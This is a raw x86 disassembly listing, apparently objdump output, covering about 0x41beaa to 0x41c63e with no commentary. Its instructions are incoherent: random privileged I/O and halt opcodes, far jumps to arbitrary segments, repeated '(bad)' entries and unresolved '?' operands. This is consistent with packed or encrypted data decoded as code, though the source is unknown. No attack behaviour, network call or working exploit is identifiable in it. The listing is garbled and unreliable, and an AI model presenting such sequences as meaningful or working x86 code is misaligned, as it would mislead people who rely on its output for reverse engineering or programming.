  41beaa:	retf   0x83d7
  41bead:	loop   0x41be6d
  41beaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beb0:	or     BYTE PTR [edi+0x7b32967e],0x94
  41beb7:	mov    edi,0x4dea3305
  41bebc:	fxch   st(2)
  41bebe:	adc    esp,DWORD PTR [eax+esi*4]
  41bec1:	jmp    0x41beca
  41bec3:	or     ebp,0xeec2889
  41bec9:	xchg   DWORD PTR [esp+ecx*8+0xb],ecx
  41becd:	push   ebx
  41bece:	mov    bl,0xa2
  41bed0:	aaa    
  41bed1:	lock mov al,0xe9
  41bed4:	fwait
  41bed5:	sub    DWORD PTR [eax-0x70dc7f43],edi
  41bedb:	dec    edx
  41bedc:	jne    0x41bf02
  41bede:	jp     0x41be85
  41bee0:	dec    ebx
  41bee1:	add    esp,edi
  41bee3:	fist   DWORD PTR [eax]
  41bee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bee6:	push   esp
  41bee7:	sar    eax,cl
  41bee9:	ins    DWORD PTR es:[edi],dx
  41beea:	xlat   BYTE PTR ds:[ebx]
  41beeb:	rcl    BYTE PTR [edi+0x75],cl
  41beee:	ins    DWORD PTR es:[edi],dx
  41beef:	inc    ecx
  41bef0:	inc    edx
  41bef1:	mov    bh,0xb2
  41bef3:	aaa    
  41bef4:	jnp    0x41be9a
  41bef6:	jo     0x41bf13
  41bef8:	enter  0x6ae7,0xd6
  41befc:	mov    dh,0x0
  41befe:	mov    DWORD PTR ds:0x91e7aa5e,edx
  41bf04:	neg    BYTE PTR ds:[ecx-0x50]
  41bf08:	sbb    BYTE PTR [ebx+0x5f],bl
  41bf0b:	mov    eax,ds:0x32c9d242
  41bf10:	ja     0x41bf1d
  41bf12:	push   esp
  41bf13:	test   DWORD PTR gs:[ecx+ebx*2-0x45],edx
  41bf18:	inc    ecx
  41bf19:	test   BYTE PTR ds:0x5309bb0b,ah
  41bf1f:	sbb    eax,0x8c540bf0
  41bf24:	mov    DWORD PTR [esi-0xb],ebx
  41bf27:	lds    edi,FWORD PTR [esi+0x11]
  41bf2a:	mov    ch,dl
  41bf2c:	add    ebp,DWORD PTR [ebp+esi*4+0x5b]
  41bf30:	mov    al,ds:0x4afc1b44
  41bf35:	push   edx
  41bf36:	(bad)  
  41bf38:	cmp    al,0x8f
  41bf3a:	sub    eax,0x615cb40
  41bf3f:	sti    
  41bf40:	jp     0x41bf98
  41bf42:	push   esi
  41bf43:	push   esi
  41bf44:	jae    0x41befb
  41bf46:	dec    ebx
  41bf47:	mov    ch,0x96
  41bf49:	xchg   ebp,ebp
  41bf4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf4c:	rcl    BYTE PTR [ebx+0x658fc68b],1
  41bf52:	sbb    ah,dl
  41bf54:	push   esi
  41bf55:	pop    ecx
  41bf56:	push   ebp
  41bf57:	retf   0x42df
  41bf5a:	push   0x13ed2f9c
  41bf5f:	adc    DWORD PTR [ecx+eiz*4],0x6229518e
  41bf66:	ins    DWORD PTR es:[edi],dx
  41bf67:	jge    0x41bf90
  41bf69:	sub    edi,edx
  41bf6b:	push   ss
  41bf6c:	mov    eax,0x6d80da40
  41bf71:	stos   DWORD PTR es:[edi],eax
  41bf72:	mov    ah,0xad
  41bf74:	outs   dx,DWORD PTR ds:[esi]
  41bf75:	add    eax,0xa2d0b40c
  41bf7a:	cmp    al,0xda
  41bf7c:	fs retf 
  41bf7e:	sub    eax,0xce428bfc
  41bf83:	xchg   ecx,eax
  41bf84:	outs   dx,DWORD PTR ds:[esi]
  41bf85:	adc    bl,ch
  41bf87:	iret   
  41bf88:	jno    0x41bf60
  41bf8a:	jl     0x41bf0d
  41bf8c:	jbe    0x41bf86
  41bf8e:	mov    cl,0x3b
  41bf90:	retf   
  41bf91:	ds fwait
  41bf93:	sub    al,0x2f
  41bf95:	hlt    
  41bf96:	lock pop ebx
  41bf98:	lods   al,BYTE PTR ds:[esi]
  41bf99:	add    DWORD PTR [edi+0xf],edx
  41bf9c:	enter  0x3bd2,0x29
  41bfa0:	arpl   WORD PTR [ecx-0x65],bp
  41bfa3:	xchg   esp,eax
  41bfa4:	int    0xc9
  41bfa6:	pop    ss
  41bfa7:	jo     0x41bf94
  41bfa9:	test   BYTE PTR [esi+edx*4+0x2cee7752],bh
  41bfb0:	cdq    
  41bfb1:	jmp    0x126a:0x331cdbff
  41bfb8:	jmp    0x41c002
  41bfba:	sub    DWORD PTR [edi+edx*1-0x4e],ebp
  41bfbe:	jp     0x41c00e
  41bfc0:	jns    0x41bf5c
  41bfc2:	sbb    BYTE PTR ds:0x7641ba13,bh
  41bfc8:	xchg   ecx,eax
  41bfc9:	cdq    
  41bfca:	pop    es
  41bfcb:	jno    0x41c029
  41bfcd:	xchg   ecx,eax
  41bfce:	push   esp
  41bfcf:	(bad)  
  41bfd0:	dec    eax
  41bfd1:	iret   
  41bfd2:	js     0x41c039
  41bfd4:	xor    eax,0x8f54619c
  41bfd9:	repz jns 0x41bf70
  41bfdc:	fisub  WORD PTR [edi]
  41bfde:	add    al,BYTE PTR [edx+edi*8]
  41bfe1:	neg    ebx
  41bfe3:	(bad)  
  41bfe4:	es pop ecx
  41bfe6:	fnsave [ebx-0x70]
  41bfe9:	std    
  41bfea:	mov    bh,0xcf
  41bfec:	mov    bh,0x94
  41bfee:	sbb    esp,DWORD PTR [edi-0x3992cae8]
  41bff4:	ret    0x4a84
  41bff7:	jg     0x41bfe5
  41bff9:	pop    esp
  41bffa:	pop    edi
  41bffb:	pop    esi
  41bffc:	rol    BYTE PTR [ebx-0x6084b336],cl
  41c002:	cmp    BYTE PTR [edi+0x24cd874f],cl
  41c008:	shl    DWORD PTR [edi+eax*1-0x181e43fd],1
  41c00f:	mov    ebp,0x6ae6a39a
  41c014:	mov    edx,esp
  41c016:	push   ss
  41c017:	adc    dh,ch
  41c019:	jbe    0x41c049
  41c01b:	add    ecx,DWORD PTR [eax+esi*2]
  41c01e:	(bad)  
  41c01f:	cwde   
  41c020:	mov    edi,0xa21bfcb
  41c025:	mov    esi,?
  41c027:	rcl    al,0xc
  41c02a:	icebp  
  41c02b:	mov    esp,0x2a5b42cd
  41c030:	test   eax,0xaa4c8fcf
  41c035:	mov    bl,0xea
  41c037:	fs lahf 
  41c039:	(bad)  
  41c03a:	mov    ebp,0x5507f1b7
  41c03f:	mov    ?,WORD PTR [ebx-0x4bf24491]
  41c045:	inc    edi
  41c046:	dec    edx
  41c047:	shl    BYTE PTR [ebp+0x1ddb15b2],1
  41c04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c04e:	mov    edi,0x406db465
  41c053:	aam    0x77
  41c055:	jo     0x41c0b8
  41c057:	push   ss
  41c058:	xchg   esp,eax
  41c059:	lds    edi,FWORD PTR [ecx]
  41c05b:	mov    ebx,0x6fe6ce81
  41c060:	sbb    eax,0xd462f3fb
  41c065:	dec    ebx
  41c066:	pusha  
  41c067:	xlat   BYTE PTR ds:[ebx]
  41c068:	add    esp,DWORD PTR [ecx]
  41c06a:	jle    0x41c07b
  41c06c:	sbb    BYTE PTR [edx+0x2e],dh
  41c06f:	adc    esi,DWORD PTR [esi+0x11e6ab68]
  41c075:	add    bp,WORD PTR [esi+0x47742290]
  41c07c:	push   0x52
  41c07e:	loope  0x41c0d7
  41c080:	sbb    BYTE PTR [esi],dh
  41c082:	nop
  41c083:	loop   0x41c0fb
  41c085:	push   cs
  41c086:	pop    edi
  41c087:	pushf  
  41c088:	fst    QWORD PTR [ecx-0x30bdb18c]
  41c08e:	mov    edi,0xfd188e6d
  41c093:	mov    DWORD PTR [edx],0x7eddea7e
  41c099:	out    dx,eax
  41c09a:	out    0xe8,eax
  41c09c:	jbe    0x41c093
  41c09e:	in     eax,0xbc
  41c0a0:	sbb    ebx,edx
  41c0a2:	out    0xaf,eax
  41c0a4:	push   es
  41c0a5:	js     0x41c0c3
  41c0a7:	or     BYTE PTR [edi+eiz*1+0x4f],ah
  41c0ab:	pop    esi
  41c0ac:	sahf   
  41c0ad:	fwait
  41c0ae:	dec    edx
  41c0af:	sbb    eax,0x60647679
  41c0b4:	xchg   edi,eax
  41c0b5:	adc    eax,DWORD PTR [edx-0x58]
  41c0b8:	mov    dh,0xf8
  41c0ba:	je     0x41c047
  41c0bc:	es jb  0x41c078
  41c0bf:	pusha  
  41c0c0:	loope  0x41c11f
  41c0c2:	jae    0x41c067
  41c0c4:	push   eax
  41c0c6:	out    dx,eax
  41c0c7:	mov    ?,ebp
  41c0c9:	out    0x77,al
  41c0cb:	fisub  WORD PTR [ecx-0x4d73231c]
  41c0d1:	cmp    cl,BYTE PTR [ecx+ecx*1]
  41c0d4:	push   ebx
  41c0d5:	div    DWORD PTR es:[eax+0x36]
  41c0d9:	xchg   edx,eax
  41c0da:	pop    esi
  41c0db:	ds mov dh,0x0
  41c0de:	cmp    ebp,esp
  41c0e0:	mov    es,esp
  41c0e2:	stc    
  41c0e3:	pop    ebx
  41c0e4:	push   esi
  41c0e5:	cmp    al,0x7e
  41c0e7:	arpl   WORD PTR [esi],si
  41c0e9:	push   DWORD PTR [edi+0x40cfa536]
  41c0ef:	dec    ecx
  41c0f0:	pushf  
  41c0f1:	cmp    al,0x42
  41c0f3:	and    al,dl
  41c0f5:	test   ah,bh
  41c0f7:	iret   
  41c0f8:	repnz mov bh,al
  41c0fb:	jb     0x41c153
  41c0fd:	outs   dx,DWORD PTR cs:[esi]
  41c0ff:	out    dx,al
  41c100:	adc    dl,0x58
  41c103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c104:	fild   WORD PTR [ecx-0x4a]
  41c107:	mov    esp,0xdd7accb1
  41c10c:	call   FWORD PTR [edx]
  41c10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c10f:	mov    ah,0xa3
  41c111:	push   ebx
  41c112:	sti    
  41c113:	retf   
  41c114:	aas    
  41c115:	or     al,0x2f
  41c117:	call   0x2b961d5d
  41c11c:	stc    
  41c11d:	clc    
  41c11e:	mov    al,ds:0x9a7cc12d
  41c123:	sahf   
  41c124:	dec    edi
  41c125:	leave  
  41c126:	push   eax
  41c127:	outs   dx,BYTE PTR ds:[esi]
  41c128:	push   cs
  41c129:	inc    cl
  41c12b:	hlt    
  41c12c:	mov    ebx,0x6cfc7799
  41c131:	mov    edx,0x1907693c
  41c136:	cmc    
  41c137:	data16 int 0xcd
  41c13a:	inc    ebx
  41c13b:	sahf   
  41c13c:	pop    ds
  41c13d:	leave  
  41c13e:	inc    esp
  41c13f:	mov    ds:0x3834bba7,eax
  41c144:	adc    cl,BYTE PTR [ebp+esi*8+0x266c7444]
  41c14b:	in     al,0xe0
  41c14d:	jnp    0x41c12b
  41c14f:	cwde   
  41c150:	ret    0x619f
  41c153:	cmc    
  41c154:	arpl   sp,dx
  41c156:	hlt    
  41c157:	retf   0xf6a9
  41c15a:	inc    esi
  41c15b:	pop    es
  41c15c:	retf   0xdcb0
  41c15f:	lods   eax,DWORD PTR ds:[esi]
  41c160:	jb     0x41c118
  41c162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c163:	jmp    0x540e:0x948f3dd7
  41c16a:	mov    dh,0x6b
  41c16c:	add    edi,DWORD PTR [ebx]
  41c16e:	or     BYTE PTR [esi+0x30b1cf41],bl
  41c174:	retf   
  41c175:	jle    0x41c1b5
  41c177:	(bad)  
  41c178:	xor    ecx,DWORD PTR ds:0xc9b71737
  41c17e:	mov    DWORD PTR [edi+0x69ee4a4e],esp
  41c184:	ds xor eax,0x14a4260e
  41c18a:	call   0xa2c6:0xbd6d6e62
  41c191:	pop    esp
  41c192:	retf   
  41c193:	cmp    BYTE PTR [edx+eiz*8],0x25
  41c197:	mov    ecx,0xd4f58bc8
  41c19c:	cli    
  41c19d:	sti    
  41c19e:	add    esi,DWORD PTR [edi]
  41c1a0:	call   0xa8510116
  41c1a5:	jecxz  0x41c197
  41c1a7:	mov    ecx,0x8d895b9c
  41c1ac:	adc    DWORD PTR [edx-0x1],edx
  41c1af:	jae    0x41c21d
  41c1b1:	cwde   
  41c1b2:	push   ebx
  41c1b3:	xchg   BYTE PTR [edi+0x5ec5063c],ch
  41c1b9:	in     al,dx
  41c1ba:	fwait
  41c1bb:	dec    ebp
  41c1bc:	arpl   WORD PTR [ebp+0x4c],bp
  41c1bf:	daa    
  41c1c0:	sbb    BYTE PTR [ebx+0x5d77c95b],0xf0
  41c1c7:	enter  0x4b22,0x34
  41c1cb:	push   edx
  41c1cc:	retf   
  41c1cd:	(bad)  
  41c1ce:	push   ds
  41c1cf:	loopne 0x41c186
  41c1d1:	jp     0x41c1f3
  41c1d3:	pop    es
  41c1d4:	mov    si,0x5b87
  41c1d8:	les    ecx,FWORD PTR [ebp+0x5d]
  41c1db:	scas   al,BYTE PTR es:[edi]
  41c1dc:	jne    0x41c1a7
  41c1de:	data16 cld 
  41c1e0:	cdq    
  41c1e1:	push   0x73186120
  41c1e6:	mov    ch,0xf6
  41c1e8:	and    eax,0xfc762f0d
  41c1ed:	jmp    0x41c19e
  41c1ef:	push   es
  41c1f0:	mov    edi,0xf7cdb47
  41c1f5:	mov    esi,DWORD PTR [edi-0x56f86bc3]
  41c1fb:	je     0x41c187
  41c1fd:	sbb    esi,DWORD PTR ds:0xe34b16d7
  41c203:	sub    ch,bh
  41c205:	and    al,0xa8
  41c207:	mov    bh,0xba
  41c209:	xchg   edx,eax
  41c20a:	rol    bl,1
  41c20c:	cli    
  41c20d:	push   eax
  41c20e:	data16 jae 0x41c25d
  41c211:	int3   
  41c212:	jbe    0x41c282
  41c214:	push   ebx
  41c215:	sub    BYTE PTR [ecx+0x11],dl
  41c218:	mov    ebx,0xa0882982
  41c21d:	fidiv  WORD PTR [eax+0x17ba2e7b]
  41c223:	mov    ecx,0x6dd6b560
  41c228:	jo     0x41c1b7
  41c22a:	jmp    0x41c276
  41c22c:	mov    dh,0xde
  41c22e:	ror    esp,1
  41c230:	mov    ah,0x44
  41c232:	add    eax,0xc2933177
  41c237:	mov    DWORD PTR [edx-0x11],ebx
  41c23a:	jle    0x41c292
  41c23c:	(bad)  
  41c23d:	rcl    DWORD PTR [ebx-0x6c10d0e0],cl
  41c243:	popf   
  41c244:	xchg   ebx,eax
  41c245:	push   edi
  41c246:	stos   BYTE PTR es:[edi],al
  41c247:	outs   dx,DWORD PTR ds:[esi]
  41c248:	push   0x64bbfe61
  41c24d:	jns    0x41c23a
  41c24f:	ja     0x41c1ea
  41c251:	xchg   edx,eax
  41c252:	hlt    
  41c253:	cmp    DWORD PTR [edx-0xf90f977],ebp
  41c259:	push   0x70e5b7f1
  41c25e:	xor    al,0x77
  41c260:	hlt    
  41c261:	sub    al,0x3a
  41c263:	in     al,dx
  41c264:	aas    
  41c265:	popf   
  41c266:	loope  0x41c2a4
  41c268:	into   
  41c269:	neg    BYTE PTR ds:0x96a4ff23
  41c26f:	das    
  41c270:	and    BYTE PTR [edx+0x62],cl
  41c273:	cs push esi
  41c275:	out    dx,al
  41c276:	push   0xaad5fbe1
  41c27b:	repnz sbb eax,ebx
  41c27e:	loope  0x41c25a
  41c280:	in     eax,0x36
  41c282:	and    BYTE PTR [ebx+0x1d],bl
  41c285:	mov    dl,0x2b
  41c287:	pusha  
  41c288:	xchg   edi,eax
  41c289:	test   al,0xf1
  41c28b:	push   ebp
  41c28c:	loope  0x41c2f6
  41c28e:	sbb    esp,DWORD PTR fs:[eax]
  41c291:	xor    esi,DWORD PTR [eax+edi*2+0x63]
  41c295:	push   cs
  41c296:	nop
  41c297:	mov    esp,0x24aa9d52
  41c29c:	mov    ebx,0x50a267e7
  41c2a1:	fsubr  QWORD PTR [edi+0x2c5b3d45]
  41c2a7:	sbb    DWORD PTR [ebx-0x1e],edx
  41c2aa:	arpl   WORD PTR [ecx],ax
  41c2ac:	sbb    al,0x5e
  41c2ae:	in     eax,dx
  41c2af:	sbb    ebp,DWORD PTR [esp+ebx*8]
  41c2b2:	inc    edx
  41c2b3:	pop    esi
  41c2b4:	fs and ebp,esi
  41c2b7:	aam    0xc7
  41c2b9:	jae    0x41c251
  41c2bb:	or     cl,BYTE PTR [ecx-0x29a1263c]
  41c2c1:	push   edx
  41c2c2:	pop    eax
  41c2c3:	imul   ebx,ecx,0x6dc2d5ff
  41c2c9:	push   es
  41c2ca:	out    dx,al
  41c2cb:	push   esp
  41c2cc:	or     al,0x3d
  41c2ce:	cmp    edi,DWORD PTR [ebx-0x2b]
  41c2d1:	dec    ebp
  41c2d2:	sbb    al,0xe2
  41c2d4:	push   es
  41c2d5:	outs   dx,DWORD PTR ds:[esi]
  41c2d6:	popf   
  41c2d7:	test   DWORD PTR [ebp-0x1b],eax
  41c2da:	in     eax,dx
  41c2db:	push   0x918c611a
  41c2e0:	mov    al,ds:0xa5b43fba
  41c2e5:	sub    al,0x7
  41c2e7:	cdq    
  41c2e8:	xchg   ebp,eax
  41c2e9:	or     edx,ecx
  41c2eb:	push   ecx
  41c2ec:	mov    al,0xd7
  41c2ee:	and    al,0xb6
  41c2f0:	cli    
  41c2f1:	ret    0x2868
  41c2f4:	sub    DWORD PTR [eax-0x52],0x91d9f35
  41c2fb:	pop    ss
  41c2fc:	in     al,dx
  41c2fd:	dec    edx
  41c2fe:	push   ecx
  41c2ff:	outs   dx,BYTE PTR ds:[esi]
  41c300:	inc    edi
  41c301:	cs jp  0x41c28d
  41c304:	push   0x4bf778a5
  41c309:	iret   
  41c30a:	jl     0x41c313
  41c30c:	pop    es
  41c30d:	es pop ss
  41c30f:	(bad)  
  41c310:	loopne 0x41c2af
  41c312:	(bad)  
  41c313:	cli    
  41c314:	jo     0x41c357
  41c316:	and    BYTE PTR [eax-0x7b],0xce
  41c31a:	scas   eax,DWORD PTR es:[edi]
  41c31b:	sti    
  41c31c:	lock repz xchg bl,dh
  41c320:	outs   dx,DWORD PTR ds:[esi]
  41c321:	int3   
  41c322:	test   al,0x54
  41c324:	xor    al,0x8c
  41c326:	push   eax
  41c327:	ja     0x41c38a
  41c329:	or     eax,0x11996b6c
  41c32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c32f:	cs test eax,0xbb17adc1
  41c335:	sbb    al,al
  41c337:	push   ecx
  41c338:	jge    0x41c2c9
  41c33a:	call   0x3769d23a
  41c33f:	inc    DWORD PTR [edi-0x4e1ff499]
  41c345:	loop   0x41c37d
  41c347:	xchg   DWORD PTR [edx+eax*8-0x6168c8a5],edi
  41c34e:	sub    dh,BYTE PTR [ebx+0x24]
  41c351:	lods   eax,DWORD PTR ds:[esi]
  41c352:	in     eax,0x70
  41c354:	and    edi,edi
  41c356:	sar    dl,cl
  41c358:	int    0x95
  41c35a:	sbb    BYTE PTR [ebx-0xc273cc1],dh
  41c360:	loop   0x41c2e6
  41c362:	test   al,0xb
  41c364:	mov    al,ds:0xdb158a4f
  41c369:	adc    eax,0x243d962
  41c36e:	mov    esi,DWORD PTR [eax+0x278e872a]
  41c374:	add    al,0xaa
  41c376:	jmp    0x4ac36c7
  41c37b:	xchg   DWORD PTR [esi-0x19],ebx
  41c37e:	dec    ebp
  41c37f:	mov    esp,0x38413256
  41c384:	jae    0x41c30c
  41c386:	div    ebx
  41c388:	pop    esi
  41c389:	mov    ah,BYTE PTR [ecx]
  41c38b:	pop    esi
  41c38c:	or     eax,0x560e0705
  41c391:	mov    edx,0xe18726d9
  41c396:	adc    esi,DWORD PTR [ebx]
  41c398:	bound  edi,QWORD PTR [esi]
  41c39a:	jo     0x41c3e3
  41c39c:	jnp    0x41c3e4
  41c39e:	push   ds
  41c39f:	cmc    
  41c3a0:	push   es
  41c3a1:	lods   al,BYTE PTR ds:[esi]
  41c3a2:	push   ebx
  41c3a3:	push   cs
  41c3a4:	and    ah,BYTE PTR [edx-0x14]
  41c3a7:	sbb    edi,ecx
  41c3a9:	cmp    edx,DWORD PTR [edi-0x56]
  41c3ac:	call   0xb224:0x226713ff
  41c3b3:	add    al,0x66
  41c3b5:	jnp    0x41c39d
  41c3b7:	pop    edi
  41c3b8:	(bad)  
  41c3ba:	sbb    BYTE PTR [edi-0x16],ah
  41c3bd:	jmp    0xfcdc042
  41c3c2:	js     0x41c35e
  41c3c4:	arpl   bp,bx
  41c3c6:	sub    eax,0xad84c63
  41c3cb:	enter  0x3139,0x3c
  41c3cf:	xchg   edx,eax
  41c3d0:	mov    es,WORD PTR [eax-0x2501a153]
  41c3d6:	ret    0xc05e
  41c3d9:	sub    eax,DWORD PTR [ecx]
  41c3db:	mov    bh,0xd6
  41c3dd:	dec    ecx
  41c3de:	pop    esp
  41c3df:	cdq    
  41c3e0:	ss cld 
  41c3e2:	cmp    al,0x23
  41c3e4:	and    eax,0xe6db5d4c
  41c3e9:	adc    BYTE PTR [esi+0x6b0de737],ah
  41c3ef:	pop    es
  41c3f0:	xchg   esp,eax
  41c3f1:	jmp    0x41c3e4
  41c3f3:	fs popf 
  41c3f5:	dec    edi
  41c3f6:	mov    cl,0xfe
  41c3f8:	dec    esp
  41c3f9:	scas   eax,DWORD PTR es:[edi]
  41c3fa:	aam    0xc
  41c3fc:	loope  0x41c44b
  41c3fe:	stc    
  41c3ff:	mov    eax,ds:0x494f31d7
  41c404:	xchg   edx,eax
  41c405:	in     al,0xa3
  41c407:	push   edx
  41c408:	add    eax,0x652be536
  41c40d:	push   esi
  41c40e:	sti    
  41c40f:	scas   eax,DWORD PTR es:[edi]
  41c410:	and    DWORD PTR [ebp-0x5a3e8ea0],edi
  41c416:	jae    0x41c3a1
  41c418:	xor    eax,0x1cc21449
  41c41d:	icebp  
  41c41e:	cmp    DWORD PTR [edx-0xdc4a4ba],edi
  41c424:	add    BYTE PTR [eax+edi*4+0x69],ch
  41c428:	out    0x52,al
  41c42a:	mov    eax,ds:0x564210c2
  41c42f:	mov    ds,WORD PTR [eax+0x466cc3d8]
  41c435:	hlt    
  41c436:	scas   al,BYTE PTR es:[edi]
  41c437:	out    dx,eax
  41c438:	and    al,0xba
  41c43a:	pop    esp
  41c43b:	jo     0x41c47d
  41c43d:	push   eax
  41c43e:	dec    ebx
  41c43f:	push   ecx
  41c440:	imul   edx,DWORD PTR [ecx+0x40239a2f],0x4f
  41c447:	mov    al,0x99
  41c449:	aam    0xa0
  41c44b:	mov    bl,0xcb
  41c44d:	xchg   edi,eax
  41c44e:	mov    ebp,0xddba7ffb
  41c453:	sbb    BYTE PTR [edi+esi*4-0x684c04e],0xe2
  41c45b:	dec    edi
  41c45c:	inc    BYTE PTR [ebx+0x2113b224]
  41c462:	iret   
  41c463:	out    0xf0,al
  41c465:	(bad)  
  41c466:	mov    ecx,0x6cdd0590
  41c46b:	and    eax,0xaba56d9b
  41c470:	xchg   edx,eax
  41c471:	xchg   esi,eax
  41c472:	int3   
  41c473:	ret    0x1d93
  41c476:	xchg   esi,eax
  41c477:	dec    esi
  41c478:	sbb    eax,0x34254c71
  41c47d:	mov    ch,0x98
  41c47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c480:	sub    eax,0xa39bf9e2
  41c485:	es dec ecx
  41c487:	lea    esp,[esi+0x53e1d752]
  41c48d:	je     0x41c4ae
  41c48f:	loope  0x41c4a3
  41c491:	cwde   
  41c492:	mov    dl,0x3d
  41c494:	dec    ebx
  41c495:	add    al,0xc6
  41c497:	adc    DWORD PTR [ebx],0x1828424b
  41c49d:	mov    ebx,0xe808eca6
  41c4a2:	rol    DWORD PTR [ebp+0x31],0x32
  41c4a6:	out    0x6,al
  41c4a8:	loope  0x41c4cf
  41c4aa:	shl    DWORD PTR ds:0x5db9f2b3,cl
  41c4b0:	les    eax,FWORD PTR [esi-0x54be69a]
  41c4b6:	retf   
  41c4b7:	jo     0x41c484
  41c4b9:	adc    ebp,ecx
  41c4bb:	(bad)  
  41c4bc:	aad    0x76
  41c4be:	test   DWORD PTR fs:[eax-0x5f],ecx
  41c4c2:	cmp    eax,0xb8073a1
  41c4c7:	dec    esp
  41c4c8:	call   0x99d47c60
  41c4cd:	sbb    al,0xe1
  41c4cf:	push   esp
  41c4d0:	mov    edi,0xad1fc711
  41c4d5:	sub    ah,BYTE PTR [edi-0x70]
  41c4d8:	repnz rcr DWORD PTR [ecx],cl
  41c4db:	sub    DWORD PTR [eax],ecx
  41c4dd:	icebp  
  41c4de:	and    bh,BYTE PTR [edx]
  41c4e0:	mov    bh,0xe5
  41c4e2:	daa    
  41c4e3:	sub    esp,ebp
  41c4e5:	pop    eax
  41c4e6:	lahf   
  41c4e7:	cs fwait
  41c4e9:	xchg   esi,eax
  41c4ea:	ret    0x4b8f
  41c4ed:	stos   DWORD PTR es:[edi],eax
  41c4ee:	pop    esi
  41c4ef:	test   eax,0xfbc71ba
  41c4f4:	sahf   
  41c4f5:	imul   edx,DWORD PTR cs:[esi+0x7c],0xfddde0fe
  41c4fd:	mov    esi,0xadd75d71
  41c502:	sti    
  41c503:	xchg   edx,eax
  41c504:	cli    
  41c505:	dec    ebx
  41c506:	or     bl,dl
  41c508:	mov    bh,0x35
  41c50a:	adc    eax,0x541a8ef6
  41c50f:	idiv   eax
  41c511:	shl    DWORD PTR [ebx],0x7c
  41c514:	adc    ecx,DWORD PTR [eax-0x6ef3a210]
  41c51a:	add    al,BYTE PTR [eax]
  41c51c:	sbb    eax,0x5133c135
  41c521:	sar    DWORD PTR [ecx-0x2366ba83],1
  41c527:	push   ecx
  41c528:	ja     0x41c593
  41c52a:	pushf  
  41c52b:	sbb    eax,0x8bdadfdd
  41c530:	jmp    0xa9fb67a9
  41c535:	xlat   BYTE PTR ds:[ebx]
  41c536:	mov    cl,0x46
  41c538:	out    0x39,eax
  41c53a:	popf   
  41c53b:	jmp    0x8a45911b
  41c540:	or     edx,DWORD PTR [esi+0x5b]
  41c543:	sub    al,0xc6
  41c545:	cmc    
  41c546:	jg     0x41c59f
  41c548:	mov    cl,0x3c
  41c54a:	test   eax,0xb4c468ac
  41c54f:	mov    ?,ebx
  41c551:	loopne 0x41c50f
  41c553:	jg     0x41c5af
  41c555:	push   edx
  41c556:	clc    
  41c557:	out    dx,eax
  41c558:	imul   edi,esp,0xeaaba2e8
  41c55e:	mov    ds:0x739317ac,al
  41c563:	push   ebp
  41c564:	sub    ebp,edx
  41c566:	into   
  41c567:	test   dl,bl
  41c569:	fbld   TBYTE PTR [ebx+0x64a16ff5]
  41c56f:	jmp    0xdf758089
  41c574:	xor    dh,dh
  41c576:	dec    edx
  41c577:	stc    
  41c578:	jg     0x41c5ac
  41c57a:	shr    BYTE PTR [ecx],1
  41c57c:	je     0x41c5d9
  41c57e:	retf   0xcb7f
  41c581:	mov    ebp,0xe2081dd1
  41c586:	sbb    BYTE PTR [edi+0x14],dl
  41c589:	idiv   DWORD PTR [edx+0x27]
  41c58c:	repnz mov es,WORD PTR [edi]
  41c58f:	jp     0x41c54a
  41c591:	sub    al,0xaa
  41c593:	retf   0xfc9d
  41c596:	add    ebp,DWORD PTR [ebp+0x73]
  41c599:	push   edi
  41c59a:	aam    0x67
  41c59c:	ret    
  41c59d:	sbb    al,0x4c
  41c59f:	xor    esi,ebp
  41c5a1:	cdq    
  41c5a2:	loop   0x41c53f
  41c5a4:	(bad)  
  41c5a5:	adc    eax,0xd4e79268
  41c5aa:	out    0xb8,eax
  41c5ac:	cdq    
  41c5ad:	mov    dh,0xe5
  41c5af:	pop    esi
  41c5b0:	sbb    esp,DWORD PTR [ebp+0x549a27d2]
  41c5b6:	mov    eax,0xb8bc9d6d
  41c5bb:	sar    BYTE PTR [ebx+ecx*2],0x88
  41c5bf:	div    ecx
  41c5c1:	or     BYTE PTR [eiz*2+0x4aad9b35],bl
  41c5c8:	sbb    DWORD PTR [ebx+edx*8+0xe],edi
  41c5cc:	leave  
  41c5cd:	(bad)  
  41c5ce:	nop
  41c5cf:	cmp    al,0x5e
  41c5d1:	out    0x4e,eax
  41c5d3:	jmp    0xfee05e5
  41c5d8:	and    al,0x4e
  41c5da:	mov    esp,0x34dd9a31
  41c5df:	jmp    0x41c595
  41c5e1:	inc    eax
  41c5e2:	out    dx,eax
  41c5e3:	push   edx
  41c5e4:	dec    edx
  41c5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e6:	lds    ebp,FWORD PTR [ecx+ecx*2+0x75e6eec6]
  41c5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ee:	jmp    0x546e05ab
  41c5f3:	iret   
  41c5f4:	mov    ds:0x88ebea2c,eax
  41c5f9:	mov    ah,0x54
  41c5fb:	clc    
  41c5fc:	ret    0x4ae0
  41c5ff:	ins    BYTE PTR es:[edi],dx
  41c600:	xor    al,0x9f
  41c602:	icebp  
  41c603:	pushf  
  41c604:	fwait
  41c605:	lods   eax,DWORD PTR ds:[esi]
  41c606:	(bad)  
  41c607:	sbb    ecx,ecx
  41c609:	std    
  41c60a:	pop    DWORD PTR [edx-0x216526e3]
  41c610:	ds jl  0x41c5d1
  41c613:	into   
  41c614:	jle    0x41c67d
  41c616:	scas   al,BYTE PTR es:[edi]
  41c617:	xchg   edx,eax
  41c618:	pusha  
  41c619:	shl    DWORD PTR [ebp-0x6d],0x55
  41c61d:	bound  ebp,QWORD PTR [ecx+0x3281df1a]
  41c623:	jo     0x41c5d1
  41c625:	cmp    BYTE PTR [ecx-0x5991aa82],ah
  41c62b:	sub    bh,BYTE PTR [ecx+eax*8]
  41c62e:	imul   esi,DWORD PTR [ebp+0x50],0xfffffff2
  41c632:	rol    BYTE PTR [esi+ebx*1-0x48],0x67
  41c637:	push   cs
  41c638:	loope  0x41c6ab
  41c63a:	pop    ecx
  41c63b:	jbe    0x41c5e9
  41c63d:	push   esp
  41c63e:	push   es
